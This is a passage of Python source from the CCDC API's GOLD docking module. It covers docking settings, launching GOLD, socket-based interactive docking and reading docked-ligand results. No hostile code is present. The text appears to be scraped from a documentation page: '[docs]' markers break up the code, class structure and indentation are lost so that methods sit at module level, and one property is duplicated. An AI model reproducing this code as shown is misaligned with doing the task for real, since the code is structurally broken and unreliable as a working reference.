    Setting a rescoring function without a pre-set fitness function will mean the API will run a rescore-only run.
    One side effect of this will be to turn off :attr:`use_internal_ligand_energy_offset`
    '''
    if not value:
        self._rescore_function = ''
        self._settings.set_rescore_fitness_function_path('')
        self._settings.set_run_type(DockingLib.GoldConfFile.STANDARD_RUN)
        return
    value = value.lower()
    if value not in self._fitness_functions:
        raise TypeError('%s is not a recognised fitness function' % value)
    elif value == self.fitness_function:
        raise TypeError('%s is the current fitness function' % value)
    elif value == self._settings.docking_fitness_function_path():
        raise TypeError('%s is the current docking function' % value)
    else:
        self._rescore_function = value
        if self.fitness_function == '':
            self._settings.set_gold_fitness_function_path(value)
            self._settings.set_run_type(self._settings.RESCORE_RUN)
            self._settings.set_use_relative_ligand_energy(False)
        else:
            self._settings.set_rescore_fitness_function_path(value)
            self._settings.set_gold_fitness_function_path('consensus_score')
            self._settings.set_docking_fitness_function_path(self._fitness_function)
            self._settings.set_run_type(self._settings.CONSENSUS_SCORE)


@property
def score_parameter_file(self):
    '''The location of an alternative score parameter file.

    If set to a relative path the file will be found in the standard GOLD distribution.
    If set to None, the DEFAULT file will be used.
    '''
    return self._settings.score_parameter_file()


@score_parameter_file.setter
def score_parameter_file(self, value):
    if not value or value == 'DEFAULT':
        self._settings.set_score_parameter_file('DEFAULT')
    else:
        if os.path.isabs(value):
            file_name = value
        else:
            file_name = Docker.Settings._path_in_distribution(value)
        if os.path.exists(file_name):
            self._settings.set_score_parameter_file(file_name)
        else:
            raise RuntimeError('score_parameter_files: Cannot find path for %s' % value)


@property
def torsion_distribution_file(self):
    '''The location of a torsion distribution file.

    If set to a relative path, the file will be found in the standard GOLD distribution.
    If set to None, the DEFAULT file will be used.

    Note: setting this value will not turn using torsion distributions on or off. You can use
    :attr:`use_torsion_angle_distributions` to switch this on or off
    '''
    return self._settings.torsion_distribution_file()


@torsion_distribution_file.setter
def torsion_distribution_file(self, value):
    if not value or value == 'DEFAULT':
        self._settings.set_torsion_distribution_file('DEFAULT')
    else:
        if os.path.isabs(value):
            file_name = value
        else:
            file_name = Docker.Settings._path_in_distribution(value)
        if os.path.exists(file_name):
            self._settings.set_torsion_distribution_file(file_name)
        else:
            raise RuntimeError('torsion_distribution_file: Cannot find path for %s' % value)


@property
def use_torsion_angle_distributions(self):
    '''Set whether to use torsion distributions from a torsion distributions file in the genetic algorithm.
    Can be set to True or False

    :see: :attr:`torsion_distribution_file` for information on how to configure the distributions to use
    '''
    return self._settings.use_torsion_distribution()


@use_torsion_angle_distributions.setter
def use_torsion_angle_distributions(self, value):
    self._settings.set_use_torsion_distribution(bool(value))


@property
def torsion_distribution_file(self):
    '''The location of a torsion distribution file.

    If set to a relative path, the file will be found in the standard GOLD distribution.
    If set to None, the DEFAULT file will be used.

    Note: setting this value will not turn using torsion distributions on or off. You can use
    :attr:`use_torsion_angle_distributions` to switch this on or off
    '''
    return self._settings.torsion_distribution_file()


@torsion_distribution_file.setter
def torsion_distribution_file(self, value):
    if not value or value == 'DEFAULT':
        self._settings.set_torsion_distribution_file('DEFAULT')
    else:
        if os.path.isabs(value):
            file_name = value
        else:
            file_name = Docker.Settings._path_in_distribution(value)
        if os.path.exists(file_name):
            self._settings.set_torsion_distribution_file(file_name)
        else:
            raise RuntimeError('torsion_distribution_file: Cannot find path for %s' % value)


@property
def rotatable_bond_override_file(self):
    '''The location of a rotatable bond override file.

    If set to a relative path, the file will be found in the standard GOLD distribution.
    If set to None, the DEFAULT file will be used.

    Note: setting this value will not turn using the rotatable bond override file on or off. You can use
    :attr:`use_rotatable_bond_override_file` to switch this on or off
    '''
    return self._settings.rotatable_bond_override_file()


@rotatable_bond_override_file.setter
def rotatable_bond_override_file(self, value):
    if not value or value == 'DEFAULT':
        self._settings.set_rotatable_bond_override_file('DEFAULT')
    else:
        if os.path.isabs(value):
            file_name = value
        else:
            file_name = Docker.Settings._path_in_distribution(value)
        if os.path.exists(file_name):
            self._settings.set_rotatable_bond_override_file(file_name)
        else:
            raise RuntimeError('rotatable_bond_override_file: Cannot find path for %s' % value)


@property
def use_rotatable_bond_override_file(self):
    '''Set whether to use overrides from a rotatable bond override file in the genetic algorithm.
    Can be set to True or False

    :see: :attr:`rotatable_bond_override_file` for information on how to configure the file to use
    '''
    return self._settings.postprocess_bonds()


@use_rotatable_bond_override_file.setter
def use_rotatable_bond_override_file(self, value):
    self._settings.set_postprocess_bonds(bool(value))


# GA parameters
@property
def autoscale(self):
    '''The autoscale percentage, which controls how much searching is performed.

    The docker will determine how much docking is reasonable to perform on a ligand based
    on the number of rotatable bonds and the number of hydrogen donors and acceptors.  This
    percentage will scale the amount of docking done to perform faster or more thorough docking.
    '''
    return self._settings.autoscale()


@autoscale.setter
def autoscale(self, percent):
    '''Set the autoscale factor.'''
    self._settings.set_autoscale(int(percent))


# Termination options
@property
def early_termination(self):
    '''Whether early termination is permitted.

    If early termination is permitted this will be (True, number_of_solutions, rmsd_threshold),
    if not this will be (False, None, None)'''
    x = self._settings.use_early_termination()
    if x:
        return (
            x, self._settings.early_termination_n_top_solutions(), self._settings.early_termination_rmsd()
        )
    else:
        return (x, None, None)


@early_termination.setter
def early_termination(self, value):
    try:
        tf = bool(value[0])
    except (ValueError, TypeError, IndexError):
        if value:
            self._settings.set_use_early_termination(True)
            self._settings.set_early_termination_n_top_solutions(3)
            self._settings.set_early_termination_rmsd(1.5)
        else:
            self._settings.set_use_early_termination(False)
    else:
        self._settings.set_use_early_termination(tf)
        if tf:
            try:
                n = int(value[1])
            except (ValueError, TypeError, IndexError):
                self._settings.set_early_termination_n_top_solutions(3)
                self._settings.set_early_termination_rmsd(1.5)
            else:
                self._settings.set_early_termination_n_top_solutions(n)
                try:
                    f = float(value[2])
                except (ValueError, TypeError, IndexError):
                    self._settings.set_early_termination_rmsd(1.5)
                else:
                    self._settings.set_early_termination_rmsd(f)


@property
def write_options(self):
    '''Determines which write options are set.

    The options are:

    * MIN_OUT: Use this to write only the gold.log and bestranking.lst files. This is the recommended option for high-throughput virtual screening

    * NO_LOG_FILES: Use this to disable the writing of all ligand log files and the gold_protein.log file.

    * NO_LINK_FILES: Use this to disable the writing of ranked pose shortcut files to solution files. By default, one file is written per solution file.

    * NO_RNK_FILES:  Use this to disable the writing of the ranked fitness lists (.rnk extension) for each molecule. By default, one file is written per ligand.

    * NO_BESTRANKING_LST_FILE: Use this to disable the writing of the bestranking.lst file which includes a list of the highest scoring pose for each ligand.

    * NO_GOLD_SOLN_LIGAND_MOL2_FILES: Use this to disable the writing of all solution files. As there would be nothing to point to, this option also disables the writing of the ranked pose shortcut files.

    * NO_GOLD_LIGAND_MOL2_FILE: Use this to disable the writing of all ligand files. By default, one file is written per ligand.

    * NO_GOLD_PROTEIN_MOL2_FILE: Use this to disable the writing of the protein file. By default, one file is written per target protein.

    * NO_LGFNAME_FILE: Use this to disable the writing of the .lgfname file.

    * NO_PLP_MOL2_FILES: If using the ChemPLP scoring function, use this to disable the writing of plp_ligand.mol2 and plp_protein.mol2.

    * NO_PID_FILE: Use this to disable the writing of the gold.pid file.

    * NO_SEED_LOG_FILE: Use this to disable the writing of the gold.seed_log file.

    * NO_GOLD_ERR_FILE: Use this to disable the writing of the gold.err file.

    * NO_FIT_PTS_FILES: Use this to disable the writing of all files related to fitting points including, but not limited to, fit_pts.mol2 and fit_pts_merged.mol2.

    * NO_ASP_MOL2_FILES: If using the ASP scoring function, use this to disable the writing of asp_ligand.mol2 and asp_protein.mol2.

    * NO_GOLD_LOG_FILE: Use this to disable the writing of gold.log.

    Returns a list of enabled write options.
    '''
    current_write_options = []
    if self._settings.no_gold_log_file():
        current_write_options.append('NO_GOLD_LOG_FILE')
    if self._settings.no_bestranking_lst_file():
        current_write_options.append('NO_BESTRANKING_LST_FILE')
    if self._settings.min_out():
        current_write_options.append('MIN_OUT')
    if self._settings.no_log_files():
        current_write_options.append('NO_LOG_FILES')
    if self._settings.no_link_files():
        current_write_options.append('NO_LINK_FILES')
    if self._settings.no_rnk_files():
        current_write_options.append('NO_RNK_FILES')
    if self._settings.no_gold_soln_ligand_mol2_files():
        current_write_options.append('NO_GOLD_SOLN_LIGAND_MOL2_FILES')
    if self._settings.no_gold_ligand_mol2_file():
        current_write_options.append('NO_GOLD_LIGAND_MOL2_FILE')
    if self._settings.no_gold_protein_mol2_file():
        current_write_options.append('NO_GOLD_PROTEIN_MOL2_FILE')
    if self._settings.no_lgfname_file():
        current_write_options.append('NO_LGFNAME_FILE')
    if self._settings.no_plp_mol2_files():
        current_write_options.append('NO_PLP_MOL2_FILES')
    if self._settings.no_pid_file():
        current_write_options.append('NO_PID_FILE')
    if self._settings.no_seed_log_file():
        current_write_options.append('NO_SEED_LOG_FILE')
    if self._settings.no_gold_err_file():
        current_write_options.append('NO_GOLD_ERR_FILE')
    if self._settings.no_fit_pts_files():
        current_write_options.append('NO_FIT_PTS_FILES')
    if self._settings.no_asp_mol2_files():
        current_write_options.append('NO_ASP_MOL2_FILES')

    return current_write_options


@write_options.setter
def write_options(self, value):
    if isinstance(value, str):
        value = value.upper()
    else:
        try:
            value = ' '.join(v.upper() for v in value if isinstance(v, str))
        except:
            raise TypeError('write_options() requires an argument of type \'str\'.')

    # refresh write options to default
    self._settings.set_no_log_files(False)
    self._settings.set_no_link_files(False)
    self._settings.set_no_rnk_files(False)
    self._settings.set_no_bestranking_lst_file(False)
    self._settings.set_no_gold_soln_ligand_mol2_files(False)
    self._settings.set_no_gold_ligand_mol2_file(False)
    self._settings.set_no_gold_protein_mol2_file(False)
    self._settings.set_no_lgfname_file(False)
    self._settings.set_no_plp_mol2_files(False)
    self._settings.set_no_pid_file(False)
    self._settings.set_no_seed_log_file(False)
    self._settings.set_no_gold_err_file(False)
    self._settings.set_no_fit_pts_files(False)
    self._settings.set_no_asp_mol2_files(False)
    self._settings.set_no_gold_log_file(False)
    self._settings.set_min_out(False)

    if 'NO_GOLD_LOG_FILE' in value:
        self._settings.set_no_gold_log_file(True)
    if 'NO_BESTRANKING_LST_FILE' in value:
        self._settings.set_no_bestranking_lst_file(True)
    if 'MIN_OUT' in value or 'MINIMUM_OUTPUT' in value:
        self._settings.set_min_out(True)
    else:
        if 'NO_LOG_FILES' in value:
            self._settings.set_no_log_files(True)
        if 'NO_LINK_FILES' in value:
            self._settings.set_no_link_files(True)
        if 'NO_RNK_FILES' in value:
            self._settings.set_no_rnk_files(True)
        if 'NO_GOLD_SOLN_LIGAND_MOL2_FILES' in value:
            self._settings.set_no_gold_soln_ligand_mol2_files(True)
        if 'NO_GOLD_LIGAND_MOL2_FILE' in value:
            self._settings.set_no_gold_ligand_mol2_file(True)
        if 'NO_GOLD_PROTEIN_MOL2_FILE' in value:
            self._settings.set_no_gold_protein_mol2_file(True)
        if 'NO_LGFNAME_FILE' in value:
            self._settings.set_no_lgfname_file(True)
        if 'NO_PLP_MOL2_FILES' in value:
            self._settings.set_no_plp_mol2_files(True)
        if 'NO_PID_FILE' in value:
            self._settings.set_no_pid_file(True)
        if 'NO_SEED_LOG_FILE' in value:
            self._settings.set_no_seed_log_file(True)
        if 'NO_GOLD_ERR_FILE' in value:
            self._settings.set_no_gold_err_file(True)
        if 'NO_FIT_PTS_FILES' in value:
            self._settings.set_no_fit_pts_files(True)
        if 'NO_ASP_MOL2_FILES' in value:
            self._settings.set_no_asp_mol2_files(True)


@property
def diverse_solutions(self):
    '''Diverse solutions settings.

    If diverse solutions is enabled this will be (True, cluster size, rmsd), otherwise
    (False, None, None)
    '''
    tf = self._settings.use_diverse_solutions()
    if tf:
        return (
            True, self._settings.diverse_solutions_cluster_size(), self._settings.diverse_solutions_rmsd()
        )
    else:
        return (False, None, None)


@diverse_solutions.setter
def diverse_solutions(self, value):
    try:
        tf = bool(value[0])
    except (ValueError, TypeError, IndexError):
        if value:
            self._settings.set_use_diverse_solutions(True)
            self._settings.set_diverse_solutions_cluster_size(1)
            self._settings.set_diverse_solutions_rmsd(1.5)
        else:
            self._settings.set_use_diverse_solutions(False)
    else:
        self._settings.set_use_diverse_solutions(tf)
        if tf:
            try:
                n = int(value[1])
            except (ValueError, TypeError, IndexError):
                self._settings.set_diverse_solutions_cluster_size(1)
                self._settings.set_diverse_solutions_rmsd(1.5)
            else:
                self._settings.set_diverse_solutions_cluster_size(n)
                try:
                    f = float(value[2])
                except (ValueError, TypeError, IndexError):
                    self._settings.set_diverse_solutions_rmsd(1.5)
                else:
                    self._settings.set_diverse_solutions_rmsd(f)


@property
def seed_file(self):
    '''The seed file for the pseudo random number generator'''
    return self._settings.seed_file()


@seed_file.setter
def seed_file(self, value):
    self._settings.set_seed_file(value)


[docs]


def set_hostname(self, hostname='localhost', ndocks=1):
    '''Set the hostname on which docking jobs will be run.'''
    self._socket = self._pick_unused_port(hostname)
    self._port = self._socket.getsockname()[1]
    self._settings.set_ligands_from_socket(
        hostname, self._port, ndocks
    )
    self._settings.set_ligands_to_socket(
        hostname, self._port
    )
    self.output_file = ''


@staticmethod
def _pick_unused_port(hostname='localhost'):
    '''Private: get an unused port for a socket.
    May fail if someone else grabs it between query and binding.
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((hostname, 0))
    # addr, port = s.getsockname()
    # s.close()
    return s


def _start_gold(self, file_name=None, mode='foreground'):
    '''Private: start the gold server.'''
    if self._gold_exe is None:
        if 'GOLD_EXE' in os.environ:
            self._gold_exe = os.path.abspath(os.environ['GOLD_EXE'])
        else:
            if 'GOLD_DIR' in os.environ:
                self._gold_dir = os.environ['GOLD_DIR']
            else:
                raise RuntimeError('''GOLD not installed or configured.
Some features of the CSD Python API will not be available.''')
            if not os.path.exists(self._gold_dir):
                raise RuntimeError('Unable to find a GOLD executable in %s' % self._gold_dir)
            if sys.platform == 'win32':
                self._gold_exe = os.path.join(self._gold_dir, 'gold', 'd_win32', 'bin', 'gold_win32.exe')
            else:
                self._gold_exe = os.path.join(self._gold_dir, 'bin', 'gold_auto')
    if not os.path.exists(self._gold_exe):
        raise RuntimeError('GOLD executable not found at %s' % self._gold_exe)
    if file_name is None:
        file_name = os.path.abspath('./api_gold.conf')
        # file_name = os.path.join(self.output_directory, 'api_gold.conf')
    else:
        file_name = os.path.abspath(file_name)
    if not os.path.exists(os.path.dirname(file_name)):
        os.makedirs(os.path.dirname(file_name))
    if mode.lower().startswith('inter'):
        # Preserve old tags
        self._settings.set_replace_tags(False)
        # Disable ranking stuff
        self._settings.set_bestranking_list_filename('')
        self._settings.set_delete_rank_files(True)
        # Sockets - check that sockets are enabled, or create them
        self.clear_ligand_files()
        pars = self._settings.socket_parameters()
        hostname, port = pars[0], pars[1]
        if not hostname or port == 0:
            self.set_hostname()
        else:
            if hostname != 'localhost':
                # Assume it's running???
                print('RUNNING ON', hostname)
                fname = os.path.join(self.output_directory, 'gold.pid')
                if not os.path.exists(fname):
                    raise RuntimeError('GOLD does not appear to be running on %s:%d' % (hostname, port))
                with open(fname) as f:
                    pid = int(f.read())
                return Docker.InteractiveResults(self, pid=pid)
    # if not os.path.exists(self.output_directory):
    #    os.makedirs(self.output_directory)
    if not os.path.exists(os.path.dirname(file_name)):
        os.makedirs(os.path.dirname(file_name))
    self.write(file_name)
    print('Starting GOLD with conf file %s' % file_name)
    p = subprocess.Popen(
        [self._gold_exe, file_name]
    )
    if mode.lower().startswith('back'):
        return Docker.Results(self, pid=p.pid)
    elif mode.lower().startswith('fore'):
        return Docker.Results(self, return_code=p.wait())
    else:
        # Socket docking
        return Docker.InteractiveResults(self, pid=p.pid)


[docs]


@nested_class('Docker')
class Results(object):
    '''Docking results.
    '''


[docs]


class DockedLigand(Entry):
    '''Subclass of :class:`ccdc.entry.Entry` to provide nicer access to the scoring terms of the docking.
    '''

    def __init__(self, entry, settings):
        self._entry = entry._entry
        self.attributes = entry.attributes
        self.settings = settings

    @staticmethod
    def _is_float(t):
        try:
            x = float(t)
            return True
        except ValueError:
            return False


[docs]


def fitness(self, fitness_function=None):
    '''The recorded fitness of a docking.

    :param fitness_function: one of the fitness functions of the :class:`ccdc.docking.Docker.Settings` or ``None``.

    If the docking has exactly one fitness attribute, *i.e.*, no rescoring has been performed, then there is
    no need to specify the fitness_function.
    '''
    possibles = [(k, float(v)) for k, v in self.attributes.items() if 'fitness' in k.lower() and self._is_float(v)]
    if len(possibles) == 0:
        raise RuntimeError('No fitness term in the entry')
    terms = [
        k.split('.')[1].lower() for k, v in possibles
    ]
    if fitness_function is None:
        if len(possibles) == 1:
            return possibles[0][1]
        else:
            raise RuntimeError('Fitness terms for %s in entry' % ', '.join(terms))
    else:
        matched = [(k, v) for k, v in possibles if fitness_function.lower() in k.lower()]
        if len(matched) == 0:
            raise RuntimeError('No matching fitness term.  Available are %s' % (', ').join(terms))
        elif len(matched) == 1:
            return matched[0][1]
        else:
            raise RuntimeError('Multiple matching fitness terms, %s' % ', '.join(k for k, v in matched))


[docs]


def scoring_term(self, *filters):
    '''Individual or dicts of scoring terms from the entry.

    :param fitness_function: any of the fitness functions of :class:`ccdc.docking.Settings`
    :param `*filters`: an iterable of additional constraints to put on the name of the term.
    :returns: a float if the specification is exact or a dictionary of key:float if ambiguous.
    '''
    terms = [(k, float(v)) for k, v in self.attributes.items() if self._is_float(v)]
    terms = [(k, v) for k, v in terms if all(x.lower() in k.lower() for x in filters)]
    if len(terms) == 0:
        raise RuntimeError('No scoring term matched')
    elif len(terms) == 1:
        return terms[0][1]
    else:
        return dict(terms)


[docs]


class ProteinRotatedTorsion(object):
    '''Details of a protein amino acid side chain rotated in the docking solution.'''

    def __init__(self, protein_rotated_torsion_sd_tag):
        '''Construct from the contents of a Gold.Protein.RotatedTorsions solution file SD tag.

        :param protein_rotated_torsion_sd_tag: the docked ligand Gold.Protein.RotatedTorsions SD tag string.
        '''
        self._gold_rotated_torsion = DockingLib.GoldRotatedTorsion(protein_rotated_torsion_sd_tag)
        self._type_map = {DockingLib.GoldRotatedTorsion.SIDE_CHAIN: "sidechain",
                          DockingLib.GoldRotatedTorsion.ROTATED_H: "rotated_h",
                          DockingLib.GoldRotatedTorsion.UNKNOWN: "unknown"}

    @property
    def name(self):
        return self._gold_rotated_torsion.name()

    @property
    def chi_number(self):
        '''The flexible sidechain chi number or -1 if this torsion is not part of a RotamerLibrary.'''
        chi_index_str = self._gold_rotated_torsion.chi_number()
        if chi_index_str == "":
            return -1
        return int(chi_index_str)

    @property
    def input_angle(self):
        '''The torsion angle in the protein before docking.'''
        return float(self._gold_rotated_torsion.input_angle())

    @property
    def final_angle(self):
        '''The torsion angle in the final pose.'''
        return float(self._gold_rotated_torsion.final_angle())

    @property
    def atom_indices(self):
        '''The file order index of each atom in the torsion.'''
        return list(self._gold_rotated_torsion.atoms())

    @property
    def type(self):
        '''The torsion type as a string.

        "sidechain" : a torsion in a residue sidechain as defined in a rotamer library.
        "rotated_h" : a residue terminal rotatable hydrogen e.g. in a SER, THR, TYR hydroxyl or LYS NH3.
        "unknown" : type not set, should not usually be encountered.

        :return string representation of the protein rotated torsion type.
        '''

        return self._type_map[self._gold_rotated_torsion.type()]


[docs]


def protein_rotated_torsions(self):
    '''Return the set of protein rotated torsions for a docked ligand.'''
    torsions = []
    if "Gold.Protein.RotatedTorsions" in self.attributes:
        rotated_torsions_str = self.attributes["Gold.Protein.RotatedTorsions"]
        lines = rotated_torsions_str.splitlines()
        for l in lines:
            protein_rotated_torsion = Docker.Results.DockedLigand.ProteinRotatedTorsion(l)
            torsions.append(protein_rotated_torsion)
    return torsions


[docs]


class HBond(Molecule.HBond):
    '''A hydrogen bond in the docked ligand.'''

    def __init__(self, text, ligand, results):
        self.results = results

        def _get_atom(mol_ref, at_ref):
            if mol_ref.startswith('P'):
                inx = int(mol_ref[1:]) - 1
                return self.results.proteins[inx].atoms[int(at_ref) - 1]
            else:
                return ligand.molecule.atoms[int(at_ref) - 1]

        parts = text.split()
        at0 = _get_atom(parts[0], parts[3])
        at1 = _get_atom(parts[4], parts[5])
        strength = float(parts[6])
        _contact = ChemistryLib.MolecularContact(at0._molecule, at0._atom, at1._molecule, at1._atom, strength,
                                                 ChemistryLib.MolecularContact.HBOND_CONTACT)
        super(self.__class__, self).__init__(_contact)


def hbonds(self, which=None):
    if which is None:
        s = self.settings.settings.fitness_function
    else:
        s = which
    if s.lower() == 'plp' or s.lower() == 'chemscore':
        tag = 'Gold.Chemscore.Hbonds'
    elif s.lower() == 'asp':
        return None
    elif s.lower() == 'goldscore':
        tag = 'Gold.Goldscore.Hbonds'
    text = self.attributes.get(tag)
    if text is not None:
        text = text.split('\n')
        return tuple(
            Docker.Results.DockedLigand.HBond(l, self, self.settings)
            for l in text[1:] if l
        )


@property
def docked_waters(self):
    '''
    Optionally, it is possible in GOLD to specify waters that are docked alongside a given ligand. This property
    provides access to the positions of these waters.

    :return molecules representing the docked waters in the binding site that are associated with this ligand pose as placed in the binding site
    '''
    water_data = DockingLib.GoldProteinManager.build_active_waters(self._entry)
    return tuple(Molecule(_molecule=mol) for mol in water_data)


[docs]


class DockedLigandReader(io.EntryReader):
    '''Subclass of :class:`ccdc.io.EntryReader` to provide :class:`ccdc.docking.Docker.Results.DockedLigand` instances.'''

    def __new__(kl, file_name, settings):
        ret = io._ReaderFactory.__new__(kl, file_name)
        # super(self.__class__, self).__new__(io.EntryReader, file_name)
        # super(self.__class__, self).__init__(file_name)
        ret.settings = settings
        return ret

    def _make_entry(self, _entry):
        return Docker.Results.DockedLigand(
            super(self.__class__, self)._make_entry(_entry), self.settings
        )

    def __iter__(self):
        '''Iterator.'''
        return self.entries()  # pylint: disable=E1101

    def __getitem__(self, i):
        return self._make_entry(self._enumerator.entry(i))  # pylint: disable=E1101


def __init__(self, settings, return_code=None, pid=None):
    self.settings = settings
    self.return_code = return_code
    self.pid = pid


def _read_file(self, file_name):
    '''Read it if it exists.'''
    fname = os.path.join(self.settings.output_directory, file_name)
    if os.path.exists(fname):
        with open(fname) as f:
            return f.read()


@property
def protein_log(self):
    '''The content of the protein log file.'''
    return self._read_file('gold_protein.log')


@property
def error_log(self):
    '''The content of the docking error log file.'''
    return self._read_file('gold.err')


@property
def docking_log(self):
    '''The content of the docking log file.'''
    return self._read_file('gold.log')


[docs]


def ligand_log(self, index):
    '''The content of a ligand log.'''
    l = glob.glob(os.path.join(self.settings.output_directory, 'gold_*_m*.log'))

    def mtime(f):
        return os.path.getmtime(f)

    l.sort(key=mtime)
    if index < len(l):
        return self._read_file(l[index])


@property
def ligands(self):
    '''The ligands of the docking.

    The value of this property is a :class:`ccdc.io.EntryReader`.
    Each entry has an attributes property, a dictionary of the docking information pertaining to
    the docking.
    '''
    dock_files = DockingLib.QtGoldDockingSolutionFiles(self.settings._conf_file_name)
    return Docker.Results.DockedLigandReader([x.filename_ for x in dock_files.solution_filenames()], self)


@property
def proteins(self):
    '''The protein(s) of the docking.

    :returns: a tuple of :class:`ccdc.protein.Protein`.

    This tuple will have more than one entry if ensemble docking was used.
    '''
    if not hasattr(self, '_proteins'):
        dock_files = DockingLib.QtGoldDockingSolutionFiles(self.settings._conf_file_name)
        self._proteins = tuple(
            Protein.from_file(df.filename_)
            for df in dock_files.protein_filenames()
        )
    return self._proteins


[docs]


def make_complex(self, ligand):
    '''Make the complex with the ligand, adjusting rotatables as required and including any docked active waters

    :return: a :class:`ccdc.protein.Protein` with the ligand added.
    '''
    prot_id = int(ligand.attributes.get('Gold.Ensemble.ID', 1)) - 1
    prot = self.proteins[prot_id]
    if not hasattr(prot, '_complex'):
        prot._complex = None
    if not hasattr(prot, '_added_waters'):
        prot._added_waters = []

    if prot._complex is not None:
        prot._protein_structure.remove_ligand(prot._protein_structure.ligand(prot._complex), False)

    [prot._protein_structure.remove_water(water) for water in prot._added_waters]

    prot._complex = prot._protein_structure.nligands()
    prot.add_ligand(ligand.molecule)

    if not hasattr(prot, '_manager'):
        prot._manager = DockingLib.GoldProteinManager(prot.identifier, prot._molecule)
    prot._manager.set_rotated_atoms(ligand._entry)

    prot._added_waters = [prot._protein_structure.add_water(water._molecule, False) for water in ligand.docked_waters]

    return prot


[docs]


@nested_class('Docker')
class InteractiveResults(Results):
    '''A session connecting to a GOLD process.

    If the :class:`ccdc.docking.Docker.InteractiveResults` instance has an attribute,
    'ligand_preparation', this should be either None, in which case no ligand preparation is performed,
    or an instance of :class:`ccdc.docking.Docker.LigandPreparation` whose prepare method will be
    called for each interactive docking attempted.  A default constructed :class:`ccdc.docking.Docker.LigandPreparation` will be used if the attribute is not present.
    '''
    _line_match = re.compile(
        r".*'(?P<file_name>[^']*)'.*'(?P<identifier>[^']*)'.*$"
    )
    _file_name_match = re.compile(
        r".*gold_soln_(?P<identifier>.*)_m[0-9]+_[0-9]+\.mol2"
    )

    def __init__(self, settings, pid=None):
        super(self.__class__, self).__init__(settings, pid=pid)
        # Set up the socket
        pars = settings._settings.socket_parameters()
        hostname, port = pars[0], pars[1]
        if not hasattr(settings, '_socket'):
            self._socket = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM
            )
            self._socket.bind(('', port))
        else:
            self._socket = settings._socket
        self._socket.listen(5)
        # for now, just a single GOLD job.
        self._socket.settimeout(5 * 60.)
        try:
            self._client_socket, address = self._socket.accept()
        except socket.timeout:
            raise RuntimeError('Socket timed out on accept()')
        self._client_socket.settimeout(None)

        print('CONNECTED TO', hostname, port, address)
        self._docked_ligand_count = 0
        self._wait_for_gold()

    def __del__(self):
        if hasattr(self, '_socket'):
            self._socket.close()
            self._socket = None
        if hasattr(self, '_client_socket'):
            self._client_socket.close()
            self._client_socket = None
        fname = os.path.join(self.settings.output_directory, 'gold.pid')
        if os.path.exists(fname):
            try:
                os.unlink(fname)
            except OSError:
                # File in use on windows
                pass
        socket_files = glob.glob(os.path.join(self.settings.output_directory, 'gold_SOCKET_m*.log'))
        for fname in socket_files:
            try:
                os.unlink(fname)
            except OSError:
                # File in use on windows
                pass


[docs]


def dock(self, entry):
    '''Send an entry to be docked.

    :returns: a tuple of :class:`ccdc.entry.Entry` instances.  These are the docked poses.
    '''
    if not hasattr(self, 'ligand_preparation'):
        self.ligand_preparation = Docker.LigandPreparation()
    if self.ligand_preparation is not None:
        entry = self.ligand_preparation.prepare(entry)
    structure = entry.to_string(format='mol2') + '\nGOLDMINE MOL2 TERMINATOR\n'
    structure = structure.replace('\n', '\r\n')
    header = '%d %d %s.mol2\n' % (len(structure), self._docked_ligand_count, entry.identifier)
    self._docked_ligand_count += 1
    self._send(header)
    l = self._recv_line()
    if l.startswith('SEND LIGAND'):
        pass
    self._send(structure, add_cr=False)
    l = self._recv_line()
    if l.startswith('GOT LIGAND'):
        pass
    return self._get_ligands()


def _wait_for_gold(self):
    while True:
        l = self._recv_line()
        if l.startswith('SEND LIGAND HEADER'):
            return


def _recv_line(self):
    l = []
    while 1:
        c = self._client_socket.recv(1)
        c = c.decode('ISO-8859-1')
        if not c:
            print('SOCKET CLOSED?')
            raise IOError('Socket failed (probably client died).')
        l.append(c)
        if c == '\n':
            return ''.join(l)


def _send(self, msg, add_cr=True):
    if add_cr:
        msg = msg.replace('\n', '\r\n')
    msg = msg.encode()
    to_send = len(msg)
    total_sent = 0
    while total_sent < to_send:
        sent = self._client_socket.send(msg[total_sent:])
        if sent == 0:
            pars = self.settings._settings.socket_parameters()
            hostname, port = pars[0], pars[1]
            raise RuntimeError('Socket connection %s:%d broken' % (hostname, port))
        total_sent += sent


def _get_ligands(self):
    ligs = []
    chunks = []
    bytes_in = 0
    in_ligand = False
    while True:
        line = self._recv_line()
        if line.startswith('SEND LIGAND HEADER'):
            break
        if line.startswith('DOCKED LIGAND'):
            in_ligand = True
        if line.startswith('END DOCKED LIGAND'):
            in_ligand = False
            structure = ''.join(chunks).replace('\r', '')
            lig = Entry.from_string(structure, format='mol2')
            # Patch up identifier
            parts = lig.identifier.split('|')
            identifier = '%s|%s|%s' % (parts[0], parts[0], '|'.join(parts[2:]))
            lig.identifier = identifier
            ligs.append(Docker.Results.DockedLigand(lig, self.settings))
            chunks = []
        else:
            if in_ligand:
                chunks.append(line)
            else:
                print('UNRECOGNISED LINE:', line)
    # Remove ranked_ files
    ranked_files = glob.glob(os.path.join(self.settings.output_directory, 'ranked_*'))
    for r in ranked_files:
        os.unlink(r)
    # Patch bestranking.lst
    best_ranking_file = os.path.join(self.settings.output_directory, 'bestranking.lst')
    if os.path.exists(best_ranking_file):
        with open(best_ranking_file) as f:
            lines = f.readlines()
        last = lines[-1]
        linem = Docker.InteractiveResults._line_match.match(last)
        if linem is not None:
            gd = linem.groupdict()
            fname = gd['file_name']
            identifier = gd['identifier']
            match = Docker.InteractiveResults._file_name_match.match(fname)
            if match is not None:
                new_name = fname.replace(match.groupdict()['identifier'], identifier)
                last = last.replace(fname, new_name)
                lines = lines[:-1] + [last]
                with open(best_ranking_file, 'w') as writer:
                    writer.write(''.join(lines))
    # rename mol2 files
    last_mol2_file = glob.glob(
        os.path.join(self.settings.output_directory, 'gold_*_m%d.mol2' % (self._docked_ligand_count)))
    if last_mol2_file:
        try:
            os.rename(last_mol2_file[0], os.path.join(self.settings.output_directory, 'gold_%s_m%d.mol2' % (
            ligs[0].identifier.split('|')[0], self._docked_ligand_count)))
        except IndexError:
            pass
    # rename log files
    last_log_file = glob.glob(
        os.path.join(self.settings.output_directory, 'gold_SOCKET_m%d.log' % (self._docked_ligand_count)))
    if last_log_file:
        try:
            os.rename(last_log_file[0], os.path.join(self.settings.output_directory, 'gold_%s_m%d.log' % (
            ligs[0].identifier.split('|')[0], self._docked_ligand_count)))
        except IndexError:
            pass
    return tuple(ligs)


def __init__(self, settings=None):
    '''Initialise the docker.'''
    if settings is None:
        settings = Docker.Settings()
    self.settings = settings


[docs]


def dock(self, file_name=None, mode='foreground'):
